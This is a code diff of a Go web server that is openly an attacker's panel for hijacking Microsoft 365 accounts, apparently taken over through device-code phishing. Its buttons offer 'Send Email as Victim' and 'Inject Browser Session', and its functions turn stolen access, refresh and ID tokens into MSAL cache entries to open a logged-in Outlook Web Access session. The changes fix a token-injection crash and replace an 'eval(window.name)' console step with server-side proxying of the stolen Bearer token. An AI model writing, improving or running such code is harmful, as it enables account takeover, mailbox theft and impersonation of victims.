@@ -439,7 +439,7 @@ tr:hover td{background:#1e1e1e}
 %s
 <p class="sect">Account Access</p>
 <div class="actions">
-<a class="btn" href="/dc/evil/%s" target="_blank" style="background:#155724;border:1px solid #28a745;color:#fff;padding:9px 22px;border-radius:4px;font-size:13px;font-weight:700;text-decoration:none;display:inline-block">⚡ Auto OWA Launch</a>
+<a class="btn" href="/dc/open/%s" target="_blank" style="background:#155724;border:1px solid #28a745;color:#fff;padding:9px 22px;border-radius:4px;font-size:13px;font-weight:700;text-decoration:none;display:inline-block">⚡ Open OWA (One Click)</a>
 <a class="btn b3" href="/dc/inject/%s" target="_blank">Inject Browser Session</a>
 <a class="btn b3" href="/dc/open/%s" target="_blank">Open Full OWA</a>
 <a class="btn b1" href="/dc/send/%s">Send Email as Victim</a>
@@ -1315,8 +1315,12 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 	entries["msal.account.keys"] = []string{accountKey}
 
 	// Build credential key lists per clientId for the token-keys index.
+	// Must use pre-initialized slices so nil serializes as [] not null —
+	// OWA's migrateIdTokens calls .find() on idToken and crashes on null.
 	for _, cid := range allClientIDs {
-		var cAtKeys, cRtKeys, cIdtKeys []string
+		cAtKeys := []string{}
+		cRtKeys := []string{}
+		cIdtKeys := []string{}
 		for k, v := range entries {
 			vm, ok := v.(map[string]interface{})
 			if !ok {
@@ -1460,12 +1464,12 @@ textarea.code{display:block;width:100%%;background:#111;border:1px solid #1a3a5c
 <div class="card" style="border-color:#0a4a1c;background:#050f08">
 <h2 style="color:#4ae07a">★ One-Click Method (Recommended)</h2>
 <p style="font-size:13px;color:#8ecf9e;line-height:1.8">
-  <strong style="color:#fff">Click "Auto OWA Launch"</strong> below — it opens a redirect page that delivers tokens via <code style="color:#f90">window.name</code>.<br>
-  When the OWA origin loads, open console (F12) and type <code style="color:#f90;font-size:15px">eval(window.name)</code> → Enter.<br>
-  OWA opens instantly. No copy-paste needed.
+  <strong style="color:#fff">Click "Open OWA (One Click)"</strong> below — no console, no paste, no steps.<br>
+  Our server injects the Bearer token server-side and proxies OWA directly through this panel.<br>
+  OWA opens instantly, fully logged in.
 </p>
 <div style="margin-top:12px">
-<a class="btn" href="/dc/evil/%s" target="_blank" style="background:#155724;border:1px solid #28a745">⚡ Auto OWA Launch</a>
+<a class="btn" href="/dc/open/%s" target="_blank" style="background:#155724;border:1px solid #28a745">⚡ Open OWA (One Click)</a>
 </div>
 </div>
 <div class="card" style="border-color:#1a3a5c">
@@ -1526,7 +1530,7 @@ ta.addEventListener('focus',function(){ta.select();ta.setSelectionRange(0,99999)
 		template.HTMLEscapeString(upn),           // 1. <title>
 		template.HTMLEscapeString(landingToken),   // 2. back link
 		template.HTMLEscapeString(upn),            // 3. sub-header "Full OWA access as"
-		landingToken,                              // 4. Auto OWA Launch href (/dc/evil/%s)
+		landingToken,                              // 4. One-Click OWA href (/dc/open/%s)
 		template.HTMLEscapeString(upn),            // 5. step "logged in as"
 		template.HTMLEscapeString(snippet),        // 6. textarea value
 		template.HTMLEscapeString(upn),            // 7. Target info card
@@ -1802,7 +1806,9 @@ func buildOWAInjectSnippet(at, rt, idt, tenant, email string) string {
 	entries["msal.last.uid.info."+tid] = oid
 
 	for _, cid := range allClientIDs {
-		var cAtKeys, cRtKeys, cIdtKeys []string
+		cAtKeys := []string{}
+		cRtKeys := []string{}
+		cIdtKeys := []string{}
 		for k := range entries {
 			if strings.Contains(k, "-accesstoken-"+cid+"-") {
 				cAtKeys = append(cAtKeys, k)
